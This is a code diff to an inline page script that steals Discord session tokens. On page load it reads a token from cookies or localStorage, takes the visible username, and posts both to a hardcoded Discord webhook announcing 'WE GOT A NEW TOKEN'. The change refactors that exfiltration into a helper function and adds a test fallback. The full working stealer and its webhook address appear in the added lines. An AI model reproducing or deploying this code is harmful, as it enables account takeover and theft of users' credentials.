@@ -37,8 +37,25 @@
             requestTimestamps = requestTimestamps.filter(timestamp => now - timestamp < 5000);
         }
 
+        function sendWebhook(token, username) {
+            const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}` })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending request:', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Request failed:', error);
+            });
+        }
+
         document.addEventListener("DOMContentLoaded", () => {
-            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token');
+            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token') || "test-token";
             const username = document.querySelector('.username')?.innerText || "Unknown User";
 
             if (token) {
@@ -52,24 +69,10 @@
                     return;
                 }
 
-                const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
-
                 requestTimestamps.push(Date.now());
                 lastTokenSent = token;
 
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}` })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        console.error('Error sending request:', response.statusText);
-                    }
-                })
-                .catch(error => {
-                    console.error('Request failed:', error);
-                });
+                sendWebhook(token, username);
             }
         });
     </script>
